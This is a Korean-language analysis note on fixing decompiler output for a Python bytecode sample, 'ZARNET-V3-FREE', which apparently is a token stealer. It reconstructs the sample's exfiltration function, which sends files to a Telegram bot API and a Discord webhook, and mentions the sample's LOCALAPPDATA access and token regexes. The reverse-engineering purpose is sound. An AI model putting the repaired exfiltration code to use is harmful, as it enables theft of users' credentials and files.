# option04 `ZARNET-V3-FREE` — 수정 근거

바이트코드는 CPython 3.10(매직 3439), 디컴파일러는 PyLingual이다. 기준은 `original.pyc`를
`xdis` 6.3.0으로 디스어셈블한 결과이고, 고친 `fixed.py`는 다시 컴파일해 확인했다.

## 오류 1: 루프 밖에 박힌 break

`decomp.py`의 `post_to`, 대략 213–224번째 줄이다.

```python
def post_to(file):
    token = 'TELEGRAM TOKEN'
    chat_id = 'TELEGRAM CHATID'
    webhook_url = '...'
    if token == 'TELEGRAM TOKEN':
        break                       # <-- 루프 안이 아님
    if chat_id == 'TELEGRAM CHATID':
        break                       # <-- 루프 안이 아님
    post('https://api.telegram.org/bot' + token + '/sendDocument', ...)
    if webhook_url == 'WEBHOOK URL':
        return
    post(webhook_url, ...)
```

`ast.parse`가 이걸 통과시키기 때문에 놓치기 쉽다. 루프 밖의 `break`는 파싱 오류가 아니라 그 뒤
심볼 테이블(symtable) 분석, 즉 컴파일 단계에서 잡힌다.

```
$ python -c "compile(open('decomp.py').read(),'x','exec')"
SyntaxError: 'break' outside loop   (218번째 줄)
```

`post_to`에는 루프 옵코드(`FOR_ITER` 등)가 전혀 없으니 `break`는 원본일 수 없다. 바이트코드가 이
두 문장의 실체를 보여준다. 각각 Telegram 전송 블록 바로 뒤인 오프셋 68로 가는 조건부
`JUMP_FORWARD`다.

```
263  LOAD_FAST token; LOAD_CONST 'TELEGRAM TOKEN'; COMPARE_OP ==
     POP_JUMP_IF_FALSE -> 22
264  JUMP_FORWARD -> 68            # token == 플레이스홀더: Telegram 블록 건너뜀
266  LOAD_FAST chat_id; ... COMPARE_OP ==
     POP_JUMP_IF_FALSE -> 32
267  JUMP_FORWARD -> 68            # chat_id == 플레이스홀더: Telegram 블록 건너뜀
269  post('https://api.telegram.org/bot'+token+'/sendDocument', data=..., files=...)
>>68 LOAD_FAST webhook_url; LOAD_CONST 'WEBHOOK URL'; COMPARE_OP ==
     POP_JUMP_IF_FALSE -> 80
     RETURN_VALUE (None)           # 진짜 조기 종료는 여기, 오직 여기뿐
>>80 post(webhook_url, files=...)
```

그러니까 Telegram `post()`는 `token != 'TELEGRAM TOKEN'`이고 `chat_id != 'TELEGRAM CHATID'`일 때만
실행되고, 어떤 경우에도 제어는 `webhook_url == 'WEBHOOK URL'` 검사와 마지막 웹훅 `post()`로
이어진다. 고친 모습은 이렇다.

```python
    if token != 'TELEGRAM TOKEN' and chat_id != 'TELEGRAM CHATID':
        post('https://api.telegram.org/bot' + token + '/sendDocument', data=..., files=...)
    if webhook_url == 'WEBHOOK URL':
        return
    post(webhook_url, files=...)
```

`and` 가드는 바이트코드의 단락 평가를 그대로 재현한다. `token`이 플레이스홀더면 `chat_id`는
비교조차 되지 않는데(두 번째 비교 앞의 264 `JUMP_FORWARD`와 같다), `and`도 똑같이 동작한다.
`fixed.py`를 재컴파일하면 `post_to`는 Telegram 전송을 가드하는 `!=` 비교 두 개, 그다음
`== 'WEBHOOK URL'` 비교 하나와 `post` 호출 두 개로 나온다. 원본과 구조가 같다.

## AI 도구의 과장 주장 반박

하나는 PyLingual이 "유효한 파이썬"을 낸다는 프레이밍이다. option02와 마찬가지로 이번에도
컴파일되지 않는 파일을 내놓았다. 더 고약한 건 이 결함이 `ast.parse`를 통과한다는 점이다. 그래서
디컴파일러 출력을 `ast.parse`만으로 검증하는 흔한 지름길은 이 파일을 멀쩡하다고 넘긴다. 검증은
반드시 `compile()`까지 가야 한다.

다른 하나는 그럴듯하지만 틀린 수정, 바로 `return`이다. 분석가든, "일단 컴파일만 되게"라는 지시를
받은 LLM이든 각 `break`를 `return`으로 바꾸기 쉽다. `return`은 문법상 적법하고 세 줄 아래에 이미
`return`이 있으니 자연스러워 보인다. 하지만 틀렸다. `break`의 목적지는 `JUMP_FORWARD -> 68`,
즉 Telegram 블록만 건너뛰는 자리인데, `return`은 함수 전체를 빠져나가 오프셋 80의 Discord 웹훅
`post()`까지 건너뛴다. 컴파일은 되지만 동작이 바뀐다. 제어 흐름과 단락 평가를 둘 다 보존하는
복원은 `and` 가드뿐이다.

## 확인만 하고 손대지 않은 부분

- 모듈 레벨의 `local = os.getenv('LOCALAPPDATA')`는 `username/password` 분기 안에 올바로
  들여쓰기돼 있다(오프셋 374–378로, 거짓-분기 타깃인 `>> 380`보다 앞이다). `roaming = ...`은 380의
  분기 합류 지점이라 모듈 스코프에 있는 게 맞다.
- 토큰 정규식 두 개는 문자열 상수라 그대로 복원됐다. 정규식 자체가 엉성한 데가 있어도 그건
  작성자의 버그이지 디컴파일 오류가 아니다.
